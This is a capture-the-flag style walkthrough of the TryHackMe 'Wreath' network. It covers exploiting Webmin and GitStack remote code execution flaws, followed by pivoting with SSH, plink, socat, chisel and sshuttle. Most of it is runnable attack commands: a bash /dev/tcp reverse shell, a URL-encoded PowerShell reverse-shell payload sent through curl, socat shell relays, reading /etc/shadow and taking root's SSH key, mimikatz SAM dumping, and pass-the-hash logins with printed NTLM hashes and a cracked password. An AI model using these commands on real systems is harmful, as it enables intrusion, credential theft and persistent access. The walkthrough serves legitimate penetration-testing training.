# Wreath

In this network we are going to learn pivoting using different tools and on different Operating Systems.

- Proxychains & Foxyproxy
- SSH Tunneling / Port Forwarding
- Plink.exe
- Socat
- Chisel
- SSHuttle





## Network Architecture

The network has three machines, the first one is the outside-facing web server, the second is the local git server where the website code is updated and the final one is a personal computer.

## Enumeration

Let's start by performing an Nmap scan on the first machine.

```
nmap -p- -A -T4 <ip>
```

> PORT      STATE  SERVICE    VERSION
> 22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
> | ssh-hostkey: 
> |   3072 9c1bd4b4054d8899ce091fc1156ad47e (RSA)
> |   256 9355b4d98b70ae8e950dc2b6d20389a4 (ECDSA)
> |_  256 f0615a55349bb7b83a46ca7d9fdcfa12 (ED25519)
> 80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
> |_http-title: Did not follow redirect to https://thomaswreath.thm
> 443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
> |_http-title: Thomas Wreath | Developer
> | http-methods: 
> |_  Potentially risky methods: TRACE
> | ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
> | Not valid before: 2023-08-10T09:05:10
> |_Not valid after:  2024-08-09T09:05:10
> | tls-alpn: 
> |_  http/1.1
> |_ssl-date: TLS randomness does not represent time
> 9090/tcp  closed zeus-admin
> 9999/tcp  closed abyss
> 10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
> |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
> 19000/tcp closed igrid_

According to the results the machine has SSH open, 2 HTTP and one HTTPS.

Checking for the OS is a bit trickier, Nmap does not provide an accurate result. Hence, if we curl the web server we can maybe understand what OS the server is running from its headers.

```
curl http://<ip> -v
```

Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
Hence, centOS is the OS the webserver is running on.

If we browse to this location we will see that we are redirected to https://thomaswreath.thm

Unfortunetly, since there is no DNS setup for this site we cannot reach it. To overcome this we just have to hardcode it inside our /etc/hosts file.

```
sudo nano /etc/hosts
<ip> https://thomaswreath.thm
```

After reloading the page we have access to Thomas Wreath's page. If we scroll to the bottom we can see his phone number: +447821548812.

Additionally we can extract the version of one of the technologies the server is running: MiniServ 1.890 (Webmin httpd)

Searching this online provides us with a Unauthenticated Remote Code Execution which can probably give uf a shell to the machine (CVE-2019-15107).

## Exploitation

We can access, compile and run the exploit by downloading the code from the git repository:

```
git clone https://github.com/MuirlandOracle/CVE-2019-15107
```

After that we give the program executable permissions and run it with the ip of our target:

```
chmod +x <ip>
./CVE-2019-15107 <ip>
```

Great we have a webshell, but we should try to get a better shell. In order to do this, we should open a listener on our attacker machine.

```
nc -lnvp 4444
bash -i >& /dev/tcp/10.50.82.228/4444 0>&1
```

Good job, now that you have a working shell you can see that the user content we are running as is root.

We can extract the hash of root's password by cating the /etc/shadow file.

```
cat /etc/shadow
```

> $6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.
> BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1

Cracking this hash is probably going to be difficult, hence we should follow an easier approach to have access to the machine. Inside /root/.ssh we can see there is a private key to connect to the machine as the root user using SSH. Copy the key to the attacker machine change its permissions and login again.

```
chmod 600 id_rsa
ssh root@<ip> -i id_rsa
```

## Pivoting

As a summary of the tools in this section:

1. Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
2. SSH can be used to create both port forwards, and proxies
3. plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
4. Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
5. Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
6. sshuttle is a nicer way to create a proxy when we have SSH access on a target

### Enumeration

There are five possible ways to enumerate a network through a compromised host:

1. Using material found on the machine. The hosts file or ARP cache, for example
	
	- Linux/Windows - `arp -a` ARP cache that shows IPs of hosts that the target has interacted with recently

	- Linux/Windows static mappings - `cat /etc/hosts` and `type C:\Windows\System32\drivers\etc\hosts`

	- Linux local DNS servers - `cat /etc/resolv.conf` or `nmcli dev show`

	- Windows DNS Servers - `ipconfig /all`

2. Using pre-installed tools

	Already installed on the system, such as python, nmap etc...

3. Using statically compiled tools

	- Good resource for \*nix tools: https://github.com/andrew-d/static-binaries
	- Up-to-date Nmap for Linux: https://github.com/ernw/static-toolbox/releases/download/1.04/nmap-7.80SVN-x86_64-a36a34aa6-portable.zip

4. Using scripting techniques

	Ping Sweep using bash:
	```
	for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
	```

	Port Scanning using bash:
	```
	for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
	```

5. Using local tools through a proxy

	Absolute last resort, as scanning through something like proxychains is very slow. The one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come with the statically compiled version of the tool. As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of Nmap through a proxy specifically against the found ports.

### High-Level Overview

There are two main methods encompassed in this area of pentesting:

1. Tunnelling/Proxying: Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be tunnelled inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic Intrusion Detection System (IDS) or firewall
	
2. Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised host

A proxy is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple different machines.

Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.

### Proxychains & Foxyproxy

#### Proxychains

Proxychains is a command line tool which is activated by prepending the command proxychains to other commands. For example, to proxy netcat through a proxy, you could use the command:

`proxychains nc 172.16.0.10 23`

The master config file is located at /etc/proxychains.conf. This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:

1. The current directory (i.e. ./proxychains.conf)
2. ~/.proxychains/proxychains.conf
3. /etc/proxychains.conf

Original file(in case you need to revert changes): https://raw.githubusercontent.com/haad/proxychains/master/src/proxychains.conf

"ProxyList" section:

```
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4  127.0.0.1 9050
```

If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the proxy_dns line using a hashtag (#) at the start of the line before performing a scan through the proxy! 

Other things to note when scanning through proxychains:

1. You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy, so use the  -Pn  switch to prevent Nmap from trying it.

2. It will be extremely slow. 

#### Foxyproxy

If working in a web browser to access a webapp through a proxy, there is a better option available, namely: FoxyProxy!

SOCKS4 is usually a good bet, although Chisel (which we will cover in a later task) requires SOCKS5.

Once activated, all of your browser traffic will be redirected through the chosen port (so make sure the proxy is active!). Be aware that if the target network doesn't have internet access (like all TryHackMe boxes) then you will not be able to access the outside internet when the proxy is activated.

### SSH Tunneling / Port Forwarding

#### Forward Connections

It's possible to create both forward and reverse connections to make SSH "tunnels", allowing us to forward ports, and/or create proxies.

Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target.

There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.

##### Port Forward

1. Port forwarding is accomplished with the -L switch, which creates a link to a Local port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10: `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`

We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 on our own attacking machine. For example, by entering localhost:8000 into a web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own box.

The -fN combined switch does two things: -f backgrounds the shell immediately so that we have our own terminal back. -N tells SSH that it doesn't need to execute any commands -- only set up the connection.

##### Proxy

2. Proxies are made using the -D switch, for example: -D 1337. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be: `ssh -D 1337 user@172.16.0.5 -fN`

Correctly set up your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.

#### Reverse Connections

Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). 

##### Port Forward

Before we can make a reverse connection safely, there are a few steps we need to take:

First, generate a new set of SSH keys and store them somewhere safe (ssh-keygen):

1. `ssh-keygen` This will create two new files: a private key, and a public key.

2. Copy the contents of the public key (the file ending with .pub), then edit the ~/.ssh/authorized_keys file on your own attacking machine. You may need to create the ~/.ssh directory and authorized_keys file first.

3. On a new line, type the following line, then paste in the public key:
`command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty`

This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.

4. `sudo systemctl status ssh` Check if the SSH Server is running
`sudo systemctl start ssh` Start the SSH Server

5. Transfer the private key to the target box.

6. With the key transferred, we can then connect back with a reverse port forward using the following command.

To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:

`ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN`

#### Shutdown SSH Server

```
ps aux | grep ssh
sudo kill <pid>
```

##### Proxy

In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN

This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.

*Questions*
If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?

L

Which switch combination can be used to background an SSH port forward or tunnel?

-fN

It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?

Nay

What command would you use to create a pair of throwaway SSH keys for a reverse connection?

`ssh-keygen`

If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")

`ssh -R 22:172.16.0.100:2222 kali@172.16.0.200 -i id_rsa -fN`

What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?

`ssh -D 8000 user@target.thm -fN`

If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.

`ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN`

### Plink.exe

Plink.exe is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own inbuilt SSH client, plink is less useful for modern servers.

#### Reverse Connection

Generally speaking, Windows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:

`cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N`

To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:

`cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N`

Note that any keys generated by ssh-keygen will not work properly here. You will need to convert them using the puttygen tool, which can be installed on Kali using sudo apt install putty-tools. After downloading the tool, conversion can be done with: `puttygen KEYFILE -o OUTPUT_KEY.ppk`
Substituting in a valid file for the keyfile, and adding in the output file.

The resulting .ppk file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding taught in the previous task (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).

Note: Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the .exe. Whilst there is a copy pre-installed on Kali at /usr/share/windows-resources/binaries/plink.exe, downloading a new copy from https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html before a new engagement is sensible.

### Socat

The one big disadvantage of socat (aside from the frequent problems people have learning the syntax), is that it is very rarely installed by default on a target. That said, static binaries are easy to find for both Linux (https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat) and Windows (https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download).

Socat can also be used to create encrypted connections. 

Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both Linux and Windows compromised targets.

#### Reverse Shell Relay

Setup a listener on your attack box:
`sudo nc -lnvp 443`

On the compromised server, use the following command to start a relay:
`./socat tcp-l:8000 tcp:ATTACKER_IP:443 &`

Note: the order of the two addresses matters here. Make sure to open the listening port first, then connect back to the attacking machine.


#### Port Forwarding

##### Easy

The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. 

For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:

`./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`

The fork option is used to put every connection into a new process, and the reuseaddr option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection.

##### Quiet

The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not massive, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.

First of all, on our own attacking machine, we issue the following command:
`socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`

This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.

Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
`./socat tcp:ATTACKER_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &`

This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:
`./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &`

This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to localhost:8000 in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!

### Close Socat Jobs

```
jobs 
kill %<id>
```

### Chisel

is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. (https://github.com/jpillora/chisel/releases)

```
gunzip <file.zip>
```

You must have an appropriate copy of the chisel binary on both the attacking machine and the compromised server.

#### Reverse SOCKS Proxy

This connects back from a compromised server to a listener waiting on our attacking machine.

On our own attacking box we would use a command that looks something like this:

`./chisel server -p LISTEN_PORT --reverse &`

This sets up a listener on your chosen LISTEN_PORT. 
On the compromised host, we would use the following command:

`./chisel client ATTACKING_IP:LISTEN_PORT R:socks &`

This command connects back to the waiting listener on our attacking box, completing the proxy. As before, we are using the ampersand symbol (&) to background the processes.

Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on a different local port. Read the ouput and use that port to send data through the proxy.

R:socks -> It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side

#### Forward SOCKS Proxy

Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections). That said, it's still well worth learning how to set up a forward proxy with chisel.

In many ways the syntax for this is simply reversed from a reverse proxy.

First, on the compromised host we would use:
`./chisel server -p LISTEN_PORT --socks5`

On our own attacking box we would then use:
`./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`

In this command, PROXY_PORT is the port that will be opened for the proxy.

For example, `./chisel client 172.16.0.10:8080 1337:socks` would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.

**Proxychains Reminder:
When sending data through either of these proxies, we would need to set the port in our proxychains configuration. As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from socks4 to socks5**

#### Remote Port Forward

A remote port forward is when we connect back from a compromised target to create the forward.

For a remote port forward, on our attacking machine we use the exact same command as before:
`./chisel server -p LISTEN_PORT --reverse &`

Once again this sets up a chisel listener for the compromised host to connect back to. 
The command to connect back is slightly different this time, however:
`./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &`

You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the target port, separated by colons. Note the distinction between the LISTEN_PORT and the LOCAL_PORT. Here the LISTEN_PORT is the port that we started the chisel server on, and the LOCAL_PORT is the port we wish to open on our own attacking machine to link with the desired target port.

To use an old example, let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:
`./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &`

Connecting back to our attacking machine, functioning as a chisel server started with:
.`/chisel server -p 1337 --reverse &`

This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222.

#### Local Port Forward
As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

On the compromised target we set up a chisel server:
`./chisel server -p LISTEN_PORT`

We now connect to this from our attacking machine like so:
`./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`

For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:
`./chisel client 172.16.0.5:8000 2222:172.16.0.10:22`

#### Close Chisel Jobs

As with the backgrounded socat processes, when we want to destroy our chisel connections we can use jobs to see a list of backgrounded jobs, then kill %NUMBER to destroy each of the chisel processes.

**Note: When using Chisel on Windows, it's important to remember to upload it with a file extension of .exe (e.g. chisel.exe)!**

### sshuttle

Uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy without the use of proxychains (or an equivalent).

We can just directly connect to devices in the target network as we would normally connect to networked devices. As it creates a tunnel through SSH (the secure shell), anything we send through the tunnel is also encrypted, which is a nice bonus. We use sshuttle entirely on our attacking machine, in much the same way we would SSH into a remote server. 

**Requirements**:

1. sshuttle only works on Linux targets
2. Access to the compromised server via SSH
3. Python also needs to be installed on the server. 

The base command for connecting to a server with sshuttle is as follows:
`sshuttle -r username@address subnet `

For example, in our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:
`sshuttle -r user@172.16.0.5 172.16.0.0/24`

We would then be asked for the user's password, and the proxy would be established. The tool will then just sit passively in the background and forward relevant traffic into the target network.

Rather than specifying subnets, we could also use the -N option which attempts to determine them automatically based on the compromised server's own routing table:
`sshuttle -r username@address -N`

Bear in mind that this may not always be successful though!

As with the previous tools, these commands could also be backgrounded by appending the ampersand (&) symbol to the end.

If this has worked, you should see the following line:
`c : Connected to server.`

Unfortunately, sshuttle doesn't currently seem to have a shorthand for specifying a private key to authenticate to the server with. That said, we can easily bypass this limitation using the --ssh-cmd switch.

So, when using key-based authentication, the final command looks something like this:
`sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET`

To use our example from before, the command would be:
`sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24`

Please Note: When using sshuttle, you may encounter an error that looks like this:
```
client: Connected.
client_loop: send disconnect: Broken pipe
client: fatal: server died with error code 255
```

This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to. For instance, if we were connecting to 172.16.0.5 and trying to forward 172.16.0.0/24, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool to die.

To get around this, we tell sshuttle to exclude the compromised server from the subnet range using the -x switch.

To use our earlier example:
`sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5`

This will allow sshuttle to create a connection without disrupting itself.

## Git Server: Enumeration

The first thing we should do after compromising the target is to upload an nmap binary and execute a ping sweep on the current network and try to scan the potential targets we find.

`./nabecos-nmap -sn 10.200.81.0/24`

-sn is to only check if targets are alive

```
Nmap scan report for ip-10-200-81-1.eu-west-1.compute.internal (10.200.81.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.18s latency).
MAC Address: 02:8C:E0:55:7B:89 (Unknown)
Nmap scan report for ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100)
Host is up (0.00026s latency).
MAC Address: 02:A4:7A:C5:91:D9 (Unknown)
Nmap scan report for ip-10-200-81-150.eu-west-1.compute.internal (10.200.81.150)
Host is up (0.00018s latency).
MAC Address: 02:74:62:E1:4A:95 (Unknown)
Nmap scan report for ip-10-200-81-250.eu-west-1.compute.internal (10.200.81.250)
Host is up (0.00017s latency).
MAC Address: 02:E7:4E:C8:80:A7 (Unknown)
Nmap scan report for ip-10-200-81-200.eu-west-1.compute.internal (10.200.81.200)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 4.95 seconds
```

According to the results there are 5 hosts alive:

- .1 and .250 is not a part of the scope of this exercise
- .200 is the first machine we compromised
- .100 and .150 are new targets for us to explore

`./nabecos-nmap -Pn -p- 10.200.81.100,150`

```
All 65535 scanned ports on ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100) are filtered
MAC Address: 02:A4:7A:C5:91:D9 (Unknown)

Nmap scan report for ip-10-200-81-150.eu-west-1.compute.internal (10.200.81.150)
Host is up (0.00051s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  epmap
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
5985/tcp  open  wsman
49667/tcp open  unknown
MAC Address: 02:74:62:E1:4A:95 (Unknown)
```

As we can see from our perspective there are no open ports in the .100 machine. Nonetheless, 150 has several open ports for us to access.

From our current position we cannot perform a service scan on some of the designanted ports. Hence, we have to create a proxy on the target we have access to so that our scan is redirected to the .150 machine. In order to do this we are going to use sshuttle.

```
sshuttle -r root@10.200.81.200 --ssh-cmd "ssh -i ./Desktop/id_rsa" 10.200.81.0/24
```

Great, now we are able to connect directly to the .150 machine. Let's perform a service enumeration scan on port 80:

`nmap -p 80 -Pn -A 10.200.81.150`

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.2.22 ((Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3)
|_http-title: Page not found at /
|_http-server-header: Apache/2.2.22 (Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3
```

If you use the browser to acess port 80 you are going to see an error message, if you look at the second line there is a directory you can browse to called gitstack.

Access it and try to login with the default credentials. Since it did not work, the next step should be to search for a working exploit.

```
searchsploit gitstack
GitStack 2.3.10 - Remote Code Execution               | php/webapps/43777.py
```

We are going to use the exploit above to get remote code execution on the target but first we should fix the script so that it works for our scenario. Perform the following adjustments:

1. Add !/usr/bin/python2 at the top of the document
2. Change the IP variable
3. Use `sed -i 's/\r//' ./file.py`
4. Append your username to the filename on there is uploaded to the website and called in the POST request so that you dont replace other user's files on the network

Now you can execute the exploit and see the output.

- whoami - NT Authority\SYSTEM
- OS - Windows
- Hostname - git-serv

We can check if the target has connectivity to our machine by issuing a ping request and using tcpdump:

```
curl -X POST http://IP/web/exploit-USERNAME.php -d "a=ping -n 3 <ip>"
tcpdump -i tun0 icmp
```

Unfortunetly, the machine cannot communicate with us hence we have to set up a SOCAT relay on .200 to forward a shell back to a listener.

Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:

`firewall-cmd --zone=public --add-port 22222/tcp`

Setup a listener on your attack box:
`sudo nc -lnvp 4444`

On the compromised server, use the following command to start a relay:
`./socat tcp-l:22222 tcp:ATTACKER_IP:4444 &`


```
curl -X POST http://10.200.81.150/web/exploit-nabecos.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.81.200%27%2C22222%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
```

Great our listener got a callback and we got a shell. To secure persistence access to the machine, let's add a new user to the machine and make him a member of the Administrators group aswell as the "Remote Management Users" group.

`evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP`

`xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share`

Go to the share and launch mimikatz with a powershell terminal launch by Administrator:

```
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
```

Extract both the Administrator's hash and Thomas' NTLM hash:

1. Administrator - 37db630168e5f82aafa8461e05c6bbd1
2. Thomas - 02d90eda8f6b6b06c32d5f207831101f

You can crack Thomas' hash using Crackstation: i<3ruby

Login:

```
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.81.150
```

## Powershell Empire

In order to start Powershell Empire locally we have to launch the Powershell Empire server and the client.

Server:
`sudo powershell-empire server`

Client:
`sudo powershell-empire client`

Access Startkiller on the browser:
`http://localhost:1337`

Credentials: `empireadmin:password123`

- **Listeners** are fairly self-explanatory. They listen for a connection and facilitate further exploitation
- **Stagers** are essentially payloads generated by Empire to create a robust reverse shell in conjunction with a listener. They are the delivery mechanism for agents
- **Agents** are the equivalent of a Metasploit "Session". They are connections to compromised targets, and allow an attacker to further interact with the system
- **Modules** are used to in conjunction with agents to perform further exploitation. For example, they can work through an existing agent to dump the password hashes from the server
- **Custom plugins** which extend the functionality of the framework in various ways; however, we will not be covering this in the upcoming content.

### Listeners

Setup Listener

```
uselistener http
set Name CLIHTTP
set Host http://10.200.81.200
set Port 16000
execute
```

Kill Listener

```
kill CLIHTTP
```

### Stagers

Setup Stager

```
usestager multi/bash
set Listener CLIHTTP
execute
```
Copy the file upload it to the target machine, execute it and an agent will spawn.

### Agents

List agents

`agents`

Interact agents

`interact AGENTNAME`

Kill/rename agent

```
kill AGENTNAME
rename AGENTNAME NEWAGENTNAME
```

### Hop Listeners

